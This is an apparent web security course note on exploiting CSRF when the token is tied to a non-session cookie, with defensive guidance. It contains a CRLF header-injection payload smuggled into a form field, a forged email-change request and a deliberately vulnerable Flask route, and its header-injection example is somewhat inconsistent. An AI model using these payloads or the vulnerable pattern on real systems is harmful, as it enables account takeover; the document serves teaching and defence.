---
course: Web Security
topic: Cross-Site Request Forgery (CSRF)
tags: [web-security]
---

## CSRF Token Tied to Non-Session Cookie

In this specific variant of CSRF, the CSRF token is tied to a non-session cookie. This means that the CSRF token is stored in a cookie that is not directly related to the session management of the web application. This can complicate the exploitation process but does not eliminate the possibility of a successful attack.

### Injecting the CSRF Key Cookie

The first step in exploiting this vulnerability is to inject a CSRF key cookie into the user's session. This is achieved through HTTP header injection, where the attacker manipulates the HTTP headers to set the CSRF key cookie to a value that the attacker controls.

#### HTTP Header Injection

HTTP header injection occurs when HTTP headers are dynamically generated based on user input. If the application fails to properly validate or sanitize this input, an attacker can inject arbitrary headers, including cookies.

##### Example of HTTP Header Injection

Consider a web application that allows users to set their preferred language through a form. The application sets the `Content-Language` header based on the user's input:

```http
POST /set-language HTTP/1.1
Host: vulnerableapp.com
Content-Type: application/x-www-form-urlencoded

language=en-US
```

If the application does not properly validate the `language` input, an attacker could inject additional headers:

```http
POST /set-language HTTP/1.1
Host: vulnerableapp.com
Content-Type: application/x-www-form-urlencoded

language=en-US%0D%0ACSRF-Key: attacker-controlled-token
```

Here, `%0D%0A` represents a newline character, allowing the attacker to inject a new header (`CSRF-Key`) with a value that they control.

##### Full HTTP Request and Response

Let's look at the full HTTP request and response for this scenario:

```http
POST /set-language HTTP/1.1
Host: vulnerableapp.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

language=en-US%0D%0ACSRF-Key: attacker-controlled-token

HTTP/1.1 200 OK
Date: Mon, 23 Jan 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: CSRF-Key=attacker-controlled-token; Path=/
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

In this example, the `Set-Cookie` header is set to `CSRF-Key=attacker-controlled-token`, effectively injecting the CSRF key cookie into the user's session.

### Sending the CSRF Attack

Once the CSRF key cookie is injected, the attacker needs to send a CSRF attack to the victim with a known CSRF token. This is similar to traditional CSRF attacks, where the attacker crafts a request that includes the CSRF token.

#### Crafting the CSRF Request

The attacker crafts a request that includes the CSRF token and performs the desired action. For example, consider a web application that allows users to change their email address:

```http
POST /change-email HTTP/1.1
Host: vulnerableapp.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 54

email=new-email@example.com&csrf_token=attacker-controlled-token
```

Here, the `csrf_token` parameter is set to the value of the injected CSRF key cookie.

##### Full HTTP Request and Response

Let's look at the full HTTP request and response for this scenario:

```http
POST /change-email HTTP/1.1
Host: vulnerableapp.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 54

email=new-email@example.com&csrf_token=attacker-controlled-token

HTTP/1.1 200 OK
Date: Mon, 23 Jan 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

In this example, the web application processes the request and changes the user's email address to `new-email@example.com`.

### Detection and Prevention

#### How to Detect CSRF Vulnerabilities

Detecting CSRF vulnerabilities involves analyzing the web application's handling of CSRF tokens and session management. Tools like Burp Suite, ZAP, and OWASP ZAP can help identify potential issues.

##### Using Burp Suite

Burp Suite can be used to intercept and modify HTTP requests to test for CSRF vulnerabilities. By manipulating the CSRF token and observing the application's behavior, you can determine if the application is susceptible to CSRF attacks.

##### Using OWASP ZAP

OWASP ZAP provides automated scanning capabilities to detect CSRF vulnerabilities. By configuring ZAP to scan the web application, you can identify potential CSRF issues.

#### How to Prevent CSRF Attacks

Preventing CSRF attacks involves implementing robust CSRF protection mechanisms and ensuring proper session management.

##### Secure Coding Practices

1. **Use CSRF Tokens**: Ensure that every form or request that modifies server-side state includes a unique CSRF token.
2. **Validate CSRF Tokens**: Verify that the CSRF token in the request matches the token stored in the user's session.
3. **Use SameSite Cookies**: Set the `SameSite` attribute on cookies to `Strict` or `Lax` to prevent them from being sent in cross-site requests.

##### Example of Secure Code

Let's compare the vulnerable and secure versions of a CSRF token implementation:

**Vulnerable Code**

```python
@app.route('/change-email', methods=['POST'])
def change_email():
    email = request.form['email']
    # No CSRF token validation
    user.email = email
    db.session.commit()
    return "Email changed successfully"
```

**Secure Code**

```python
@app.route('/change-email', methods=['POST'])
def change_email():
    email = request.form['email']
    csrf_token = request.form['csrf_token']
    if csrf_token != session['csrf_token']:
        abort(403)
    user.email = email
    db.session.commit()
    return "Email changed successfully"
```

In the secure version, the CSRF token is validated against the token stored in the session before performing the action.

##### Configuration Hardening

1. **Set Secure Headers**: Ensure that cookies are marked as `HttpOnly` and `Secure`.
2. **Use Content Security Policy (CSP)**: Implement CSP to restrict the sources of content that can be loaded in the web application.

##### Example of Secure Configuration

```nginx
server {
    listen 80;
    server_name example.com;

    location / {
        add_header X-Frame-Options DENY;
        add_header X-Content-Type-Options nosniff;
        add_header X-XSS-Protection "1; mode=block";
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";
        add_header Content-Security-Policy "default-src 'self'";
    }
}
```

In this example, the `Content-Security-Policy` header restricts the sources of content that can be loaded in the web application.

### Hands-On Labs

To practice and gain hands-on experience with CSRF vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive set of labs covering various web security topics, including CSRF.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that contains numerous security vulnerabilities.

By working through these labs, you can gain practical experience in identifying and exploiting CSRF vulnerabilities, as well as implementing effective defenses.

### Conclusion

CSRF attacks are a significant threat to web applications, especially when the CSRF token is tied to a non-session cookie. By understanding the mechanics of these attacks and implementing robust defenses, you can protect your web applications from unauthorized actions. Always stay vigilant and keep your security practices up-to-date to mitigate the risks associated with CSRF vulnerabilities.

---
<!-- nav -->
[[04-CSRF Defense Mechanisms|CSRF Defense Mechanisms]] | [[Web Security (PortSwigger)/04-Cross-Site Request Forgery (CSRF)/06-Lab 5 CSRF where token is tied to non session cookie/00-Overview|Overview]] | [[06-CSRF Vulnerability Analysis|CSRF Vulnerability Analysis]]
